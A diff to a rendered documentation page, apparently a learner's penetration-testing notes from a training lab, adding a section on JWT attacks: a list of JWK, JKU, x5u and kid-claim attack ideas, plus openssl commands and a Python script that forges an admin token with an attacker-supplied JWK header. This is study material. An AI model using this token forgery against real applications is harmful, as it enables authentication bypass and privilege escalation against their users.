@@ -1851,6 +1851,34 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#other-jwt-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other JWT Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Other JWT Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacking-the-jku" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking the JKU
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2228,6 +2256,34 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#other-jwt-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Other JWT Attacks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Other JWT Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attacking-the-jku" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attacking the JKU
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -2469,6 +2525,75 @@ Works if the web application uses the algorithm specified in the alg-claim of th
 </span></code></pre></div></td></tr></table></div></li>
 <li>Copy the newly generated token and resend the landing page request with this token</li>
 </ul>
+<h3 id="other-jwt-attacks">Other JWT Attacks</h3>
+<ul>
+<li>Signing secret reuse (try using one to sign another)</li>
+<li>Attack the JWK header (replace with a public key we generated)</li>
+<li>Attack the JKU (same as attacking JWK except the header has url which points to a server hosting the public key)</li>
+<li>JKU claim may be vulnerable to blind GET-based SSRF attacks</li>
+<li>x5c and x5u claims (similar to JWK and JKU but based on the certificate/certificate chain)</li>
+<li>kid claim can lead to many attacks (including path traversal, SQL injection, command injection)</li>
+<li><a href="https://datatracker.ietf.org/doc/html/rfc7515#section-4.1">RFC for JWK headers</a> </li>
+</ul>
+<h4 id="attacking-the-jku">Attacking the JKU</h4>
+<p><div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1">openssl<span class="w"> </span>genpkey<span class="w"> </span>-algorithm<span class="w"> </span>RSA<span class="w"> </span>-out<span class="w"> </span>exploit_private.pem<span class="w"> </span>-pkeyopt<span class="w"> </span>rsa_keygen_bits:2048
+</span><span id="__span-6-2">openssl<span class="w"> </span>rsa<span class="w"> </span>-pubout<span class="w"> </span>-in<span class="w"> </span>exploit_private.pem<span class="w"> </span>-out<span class="w"> </span>exploit_public.pem
+</span><span id="__span-6-3">vim<span class="w"> </span>exploit.py
+</span></code></pre></div></td></tr></table></div>
+<div class="language-py highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.backends</span><span class="w"> </span><span class="kn">import</span> <span class="n">default_backend</span>
+</span><span id="__span-7-2"><span class="kn">from</span><span class="w"> </span><span class="nn">cryptography.hazmat.primitives</span><span class="w"> </span><span class="kn">import</span> <span class="n">serialization</span>
+</span><span id="__span-7-3"><span class="kn">from</span><span class="w"> </span><span class="nn">jose</span><span class="w"> </span><span class="kn">import</span> <span class="n">jwk</span>
+</span><span id="__span-7-4"><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+</span><span id="__span-7-5">
+</span><span id="__span-7-6"><span class="c1"># JWT Payload</span>
+</span><span id="__span-7-7"><span class="n">jwt_payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;htb-stdnt&#39;</span><span class="p">,</span> <span class="s1">&#39;isAdmin&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">}</span>
+</span><span id="__span-7-8">
+</span><span id="__span-7-9"><span class="c1"># convert PEM to JWK</span>
+</span><span id="__span-7-10"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;exploit_public.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-7-11">    <span class="n">public_key_pem</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-7-12"><span class="n">public_key</span> <span class="o">=</span> <span class="n">serialization</span><span class="o">.</span><span class="n">load_pem_public_key</span><span class="p">(</span><span class="n">public_key_pem</span><span class="p">,</span> <span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
+</span><span id="__span-7-13"><span class="n">jwk_key</span> <span class="o">=</span> <span class="n">jwk</span><span class="o">.</span><span class="n">construct</span><span class="p">(</span><span class="n">public_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;RS256&#39;</span><span class="p">)</span>
+</span><span id="__span-7-14"><span class="n">jwk_dict</span> <span class="o">=</span> <span class="n">jwk_key</span><span class="o">.</span><span class="n">to_dict</span><span class="p">()</span>
+</span><span id="__span-7-15">
+</span><span id="__span-7-16"><span class="c1"># forge JWT</span>
+</span><span id="__span-7-17"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;exploit_private.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span id="__span-7-18">    <span class="n">private_key_pem</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-7-19"><span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">jwt_payload</span><span class="p">,</span> <span class="n">private_key_pem</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;RS256&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;jwk&#39;</span><span class="p">:</span> <span class="n">jwk_dict</span><span class="p">})</span>
+</span><span id="__span-7-20">
+</span><span id="__span-7-21"><span class="nb">print</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1">python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>.venv
+</span><span id="__span-8-2"><span class="nb">source</span><span class="w"> </span>.venv/bin/activate
+</span><span id="__span-8-3">pip3<span class="w"> </span>install<span class="w"> </span>pyjwt<span class="w"> </span>cryptography<span class="w"> </span>python-jose
+</span><span id="__span-8-4">python3<span class="w"> </span>exploit.py
+</span><span id="__span-8-5"><span class="c1"># resend landing page request with generated JWT</span>
+</span></code></pre></div></td></tr></table></div></p>
 
 
 
